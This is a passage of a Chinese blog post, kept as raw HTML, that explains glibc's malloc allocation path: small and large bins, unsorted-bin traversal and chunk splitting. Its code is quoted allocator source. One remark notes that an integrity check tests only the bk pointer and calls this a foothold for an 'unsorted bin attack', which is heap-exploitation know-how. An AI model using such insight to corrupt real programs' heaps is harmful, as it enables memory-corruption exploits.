class="line">victim-&gt;fd-&gt;bk=victim-&gt;bk;</span><br><span class="line">victime-&gt;bk-&gt;fd=victim-&gt;fd;</span><br></pre></td></tr></table></figure><p>在这里呢，我们取链的最后一个<code>chunk</code>，也就是<code>bin-&gt;bk=victim</code>所以<code>victim-&gt;fd=bin</code></p><p>然后前面有一个赋值就是<code>bck=victim-&gt;bk</code>。带进上面的式子就得到了源码里面这样的写法。</p><p>然后下面设置<code>main_arena</code>标志位，一波同样的<code>check</code>，然后返回内存指针。也就是这里的<code>chunk2mem</code>，我们这里用的<code>chunk</code>指针，但是其实我们要返回的应该是<code>chunk</code>中数据域的指针，所以这里用了这样的宏定义做替换。</p><p>然后就是清除<code>data</code>数据，但是这个一般不会被执行，前面也分析过了，然后返回。这是<code>small bin</code>找到对应的<code>chunk</code>的逻辑，如果<code>small bin</code>还没找到那么接下来应该要去找<code>large bin</code>了，那么我们接着往下读。</p><h3 id="第四段：分配largebin时的操作"><a href="#第四段：分配largebin时的操作" class="headerlink" title="第四段：分配largebin时的操作"></a>第四段：分配largebin时的操作</h3><p>那么如果没有在small bin的范围内呢。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一步比较耐人寻味。</p><p>先获取<code>large bin</code>的<code>index</code>，然后如果<code>fast bin</code>不为空，调用<code>malloc_consolidate</code>。这一步是什么意思呢？我们前面分析过<code>malloc_consolidate</code>，如果没有初始化，那么初始化，如果初始化了，那么合并所有的<code>fast bin</code>。但是这里，都已经有<code>fast bin</code>存在了，那么堆指定已经初始化了，所以这里执行的逻辑基本只能是合并所有<code>fast chunk</code>。为什么要在搜索<code>large bin</code>的时候合并所有<code>fast bin</code>呢？因为<code>large bin</code>的匹配方式是最小能满足，然后切割。</p><p>考虑这样一种情况：</p><p>如果一个<code>0x20</code>的<code>fast bin</code>和0x500的<code>large bin</code>物理相邻。此时我要申请一个<code>0x510</code>的<code>large bin</code>，如果此时<code>fast bin</code>被合并了，那么我就能找到一个<code>0x520</code>的<code>large bin</code>并把它返回给用户。如果我不做这一步，那么我找不到<code>0x510</code>大小的<code>large bin</code>，我就被迫只能切割<code>top_chunk</code>了，这样子就浪费了很大的一块内存。</p><p>那么这个会不会有多此一举的时候呢，也是会的，还是刚刚那种情况，假如我申请<code>0x500</code>的<code>chunk</code>。这样子合并之后又会被切割，那么这样子，之前的合并就显得多次一举了，但是它只是浪费了一部分时间开销，内存分配上还是执行上面的逻辑比较占优势。所以这一步可以理解为空间上的优化，但是牺牲了小部分时间。看不来的话可以多看看上面举得例子。</p><h3 id="第五段：large-bin和unsorted-bin的相爱相杀"><a href="#第五段：large-bin和unsorted-bin的相爱相杀" class="headerlink" title="第五段：large bin和unsorted bin的相爱相杀"></a>第五段：large bin和unsorted bin的相爱相杀</h3><p>这里开始逻辑都混合起来了，不仅有<code>large bin</code>，unsorted bin，切割<code>top_chunk</code>，还有系统调用重新分配<code>top_chunk</code>。</p><h4 id="第1小块"><a href="#第1小块" class="headerlink" title="第1小块"></a>第1小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">           ......</span><br><span class="line">         &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先外面套了一个<code>while(1)</code>，然后里面有一个<code>while</code>循环，判断内容就是取得最后一个<code>unsorted chunk</code>是否与这个<code>bin</code>相等，这里大概就是开始遍历<code>unsorted chunk</code>了。</p><p>然后这里又有一个<code>check</code>。<code>victim-&gt;size &lt;= 2 * SIZE_SZ</code>就是说<code>chunk</code>的<code>size</code>小于等于<code>0x10</code>，<code>victim-&gt;size &gt; av-&gt;system_mem</code>就是说我一个块的<code>size</code>居然比我系统调用申请来的内存都多，那这肯定不合理啊，所以任意满足一个就会报错了。</p><h4 id="第二小块"><a href="#第二小块" class="headerlink" title="第二小块"></a>第二小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">    av-&gt;last_remainder = remainder;</span><br><span class="line">    remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">    &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有四个条件：</p><ol><li><code>in_smallbin_range (nb)</code>：申请<code>small bin</code>范围内的<code>chunk</code></li><li><code>bck == unsorted_chunks (av)</code>：<code>bck=victim-&gt;bk=unsorted_chunks(av)-&gt;bk-&gt;bk</code>，也就是说<code>unsorted_chunks (av)-&gt;bk-&gt;bk=unsorted_chunks (av)</code>，翻译一下差不多就是<code>unsorted bin中</code>只有一个<code>chunk</code>。</li><li><code>victim == av-&gt;last_remainder</code>：就是说这个chunk刚好是最近被分割过的剩余部分。</li><li><code>(unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))</code>：保证我找到的这个<code>chunksize</code> &gt; 需要的最小块+<code>MINSIZE</code>。为了保证等会我切割出<code>nb size</code>之后剩余的<code>chunk</code>能&gt;<code>MINSIZE</code>，这里我也不知道为什么不能等于，可能解读哪里有误吧，如果您知道请帮我勘误一下，谢谢了。</li></ol><p>然后接下来就是切割<code>victim</code>，切割出一块刚刚好大小的<code>chunk</code>给用户，切割出来的<code>chunk</code>作为新的<code>av-&gt;last_remainder</code>，注意如果切割剩余的<code>chunk size</code>不符合<code>small bin</code>的大小，则<code>fd_nextsize</code>和<code>bk_nextisze</code>会被清空，因为剩余的的<code>chunk</code>会被放到<code>unsorted bin</code>当中。</p><p>然后设置<code>victim</code>的<code>size</code>为<code>nb|PREV_INUSE</code>，然后判断是否为主分配加上标记。</p><p>然后把remainder的<code>prev_inuse</code>位设置为1，因为前一个块已经被拿走使用了，所以这个<code>prev_inuse</code>要设置为1。</p><p>然后因为<code>remainder</code>的<code>size</code>发生了改表，所以下一个<code>chunk</code>的<code>prev_size</code>也要相应地改变。</p><p>剩下的前面类似的都讲过就不赘述了。</p><h4 id="第三小块"><a href="#第三小块" class="headerlink" title="第三小块"></a>第三小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">&#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">&#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>否则会先取出这最后一个<code>chunk</code>，把它移除<code>unsorted bin</code>。如果取出的这个<code>size</code>刚好等于这个<code>nb</code>，那就说明这个块一定是最合适的，直接把它返回了，不要迟疑。如果并不是最合适呢，那么先会判断一下它是否属于<code>small bin</code>，属于则执行以下的逻辑，把<code>bck</code>对应<code>bin</code>的<code>bk</code>，<code>fwd</code>为对应<code>bin</code>的<code>fd</code>，也就是找到那一对<code>bin</code>，<code>fwd</code>在前，<code>bck</code>在后。就没了，预计等会就要用这些指针把<code>chunk</code>链进去了。</p><h4 id="第四小块"><a href="#第四小块" class="headerlink" title="第四小块"></a>第四小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">            &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不是<code>small bin</code>，那就得进<code>large bin</code>了，要进<code>large bin</code>。这里要知道，<code>large bin</code>可是所有<code>bin</code>当中最复杂的<code>bin</code>了，一个<code>chunk</code>四个指针，一对<code>bin</code>管理一个二维双向链表，<code>fd</code>,<code>bk</code>指针与相同大小的<code>chunk</code>连接，<code>fd_nextsize</code>和<code>bk_nextsize</code>与不同大小的<code>chunk</code>连接。</p><p>然后呢，虽然<code>fd</code>和<code>bk</code>是连接相同大小的<code>chunk</code>，但是那一对bin还是相当于是<code>fd</code>和<code>bk</code>字段。除了表头以外，其余的不同大小的chunk都是靠<code>fd_nextsize</code>和<code>bk_nextsize</code>的。并且沿着<code>bk_nextsize</code>，<code>chunksize</code>递增。也就是说<code>av-&gt;bin[index]-&gt;bk</code>是第一个<code>chunk</code>，并且<code>size</code> 最小，然后通过<code>bk_nextsize</code>字段一直连接到<code>av-&gt;bin[index]-&gt;fd</code>，反向同理。还有一点需要注意：<code>large bin</code>所在的<code>chunk</code>并不与<code>chunk</code>双向连接。</p><p>这里给出一张<code>large bin</code>的结构图，看看能不能帮助理解一下</p><p><img src="/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2.png" alt="2"></p><p>那么这里的<code>bck</code>指的是<code>bin</code>所在的<code>chunk</code>，<code>fwd</code>指的是最大的这个<code>chunk</code>。</p><p><code>bck-&gt;bk</code>指的就是图上的n号<code>chunk</code>，也是这个<code>large bin</code>中最小的那个<code>chunk</code>，如果拿出来的<code>unsorted bin</code>它比最小的<code>chunk</code>还要小，那就已经可以确定插入在哪了，就不用做下面的循环再看看它在哪了。然后就是一个链表的插入操作，这里要注意的是，<code>bin</code>所在的<code>chunk</code>只有<code>fd</code>和bk指针，而其它<code>chunk</code>都是<code>fd_nextsize</code>和<code>bk_nextsize</code>连接的。我们只需要先在最大块和最小块之间插入，然后把<code>bin-&gt;bk</code>指向<code>victim</code>即可。</p><p>那么我们大概自己写一下操作看看与源码是否一致。首先不考虑bin，只考虑链表的情况下，我们先找到最大块和最小块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fwd=bin-&gt;fd;</span><br><span class="line">bck=bin-&gt;bk;</span><br><span class="line">victim-&gt;bk_nextsize=bck;</span><br><span class="line">victim-&gt;fd_nextsize=fwd;</span><br><span class="line">fwd-&gt;bk_nextsize=bck-&gt;fd_nextsize=victim;</span><br></pre></td></tr></table></figure><p>跟上面大致一样，只不过它这里<code>fwd</code>的值是那个<code>large bin</code>的<code>chunk</code>，直接通过<code>fd</code>指针也能直接找到最大的<code>chunk</code>。所以我后面的主要代码应该把<code>fwd</code>改成<code>fwd-&gt;fd</code>就跟上面一模一样了。</p><p>如果不是，那就接着往<code>bk_nextsize</code>这个指针上面找，找到大于等于的<code>chunk</code>为止。然后如果等于，就只需要用<code>fd</code>和<code>bk</code>指针与相等大小的<code>chunk</code>相连，如果没有相等，就得在<code>fd_nextsize</code>和<code>bk_nextsize</code>方向上插入，然后<code>fd</code>和<code>bk</code>都默认指向自己。这个我就不演试了，跟前面那个基本是一样的。</p><h4 id="第五小块"><a href="#第五小块" class="headerlink" title="第五小块"></a>第五小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line"><span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这个就很简单了，就是一个插入操作，前面既然已经找到了插入的位置，这里一气呵成直接解决了。然后这里还有一个遍历<code>unsorted bin</code>的最大值，一次最多遍历<code>10000</code>个<code>unsorted bin</code>，这个也可以理解，如果我一次产生了很多的<code>unsorted bin</code>，然后我一次<code>malloc</code>，那边一直在循环搞这个<code>unsorted bin</code>，迟迟就没分配内存回来所以这里设定一个最大值。</p><p>到了这里，对<code>unsorted bin</code>的遍历就结束了。</p><h4 id="第六小块"><a href="#第六小块" class="headerlink" title="第六小块"></a>第六小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">    &#123;</span><br><span class="line">        victim = victim-&gt;bk_nextsize;</span><br><span class="line">        <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">            victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">        <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">            victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">        &#123;</span><br><span class="line">            set_inuse_bit_at_offset (victim, size);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            remainder = chunk_at_offset (victim, nb);</span><br><span class="line">            <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">            bck = unsorted_chunks (av);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">            &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): cor</span></span><br><span class="line"><span class="string">                    rupted unsorted chunks&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            remainder-&gt;bk = bck;</span><br><span class="line">            remainder-&gt;fd = fwd;</span><br><span class="line">            bck-&gt;fd = remainder;</span><br><span class="line">            fwd-&gt;bk = remainder;</span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">            &#123;</span><br><span class="line">                remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">            set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">            set_foot (remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这边就看这个最小能满足的<code>nb</code>是否在<code>small bin</code>的范围内。不在则执行，其实如果在的话，那前面有一个<code>small bin</code>的范围判断，如果<code>small bin</code>范围那，<code>idx</code>就是<code>small bin</code>，不在则是<code>large bin</code>的<code>idx</code>。<code>small bin</code>之前已经判断过一遍了，并且判断策略也跟之前不一样，所以这里加一个<code>!in_small_bin_range</code>的判断还是很有必要的。</p><p>来看下面的if语句，两个条件。</p><ol><li><code>(victim = first (bin)) != bin</code>：这个bin里面有<code>chunk</code>，并使<code>victim=bin-&gt;fd</code></li><li><code>(unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)</code>：找到目标chunk的size要大于等于这个最小能满足的size  nb。</li></ol><p>同时满足那么就可能要取这一块chunk来分配了，正如注释所说，如果bin为空或者最大的chunk还是比较小，那就跳过这个逻辑。然后<code>victim = victim-&gt;bk_nextsize</code>，这里<code>victim</code>是最大块，最大块的<code>bk_nextsize</code>就是最小块，这里应该也是尽量寻找最小能满足的块。正如循环所描述，如果<code>victim</code>的<code>chunk size</code>比我所需的最小能满足的<code>chunk size</code> <code>nb</code>还小，那就去寻找比他大的，因为是递增，所以能保证在<code>chunk</code>当中我一定会找到一个最小能满足的<code>chunk</code>。</p><p>这里解释一下两个最小能满足的意思：</p><p>首先<code>nb</code>是指用户需要的最小能满足的块的<code>size</code>，比如我只需要1个字节，但是我最小的<code>chunk size</code>都是<code>0x20</code>了，<code>0x20</code>的<code>chunk</code>就是对用户最小能满足的<code>chunk size</code>了。</p><p>如果能找到<code>size=nb</code>的块，当然是最好不过了，但是现实往往不会那么顺利，比如我只有一个<code>0x30</code>的块，如果我只有<code>0x30</code>而没有<code>0x20</code>的块，那么<code>0x30</code>就是我所有<code>free</code>块当中的最小能满足，其实这里<code>nb</code>应该叫最优能满足，但是我还是习惯这么叫了hhh。</p><p>然后呢找到这个之后就<code>unlink</code>这个块，把它从链中删除，拿出来之后进行一个判断，如果切割之后的块小于MINSIZE，那就不切割了，直接把它物理相邻的下一个快<code>prev_inuse</code>位设1，这个块就直接返回给用户了。否则就是切割，设置各种东西，这个前面有差不多的代码，我们主要看看剩下的块去哪里了，很明显，重新链入<code>unsorted bin</code>了。后面有一个<code>check</code>，如果<code>unsorted bin-&gt;fd-&gt;bk!=unsorted bin</code>，那么报错退出。这里需要注意，它只检测了<code>unsorted bin-&gt;fd-&gt;bk</code>是否等于那个<code>unsorted bin</code>，对于堆块来说我就是只检测了<code>bk</code>指针，这意味着<code>fd</code>指针如果修改为任意值不会在这里被检测到，这是一个利用小技巧，也只有你读过源码后才能好好理解这个<code>unsorted bin attack</code>了。然后如果剩余大小不在<code>small bin</code>范围内把<code>nextsize</code>指针全部清空，其它就是正常返回了。如果被切割的剩下<code>chunk</code>不在<code>small bin</code>范围内，就会清空它的<code>fd_nextsize</code>和<code>bk_nextsize</code>。因为它要回到<code>unsorted bin</code>里面，这两个字段就没什么用了，就会被清空。</p><h4 id="第七小块"><a href="#第七小块" class="headerlink" title="第七小块"></a>第七小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">++idx;</span><br><span 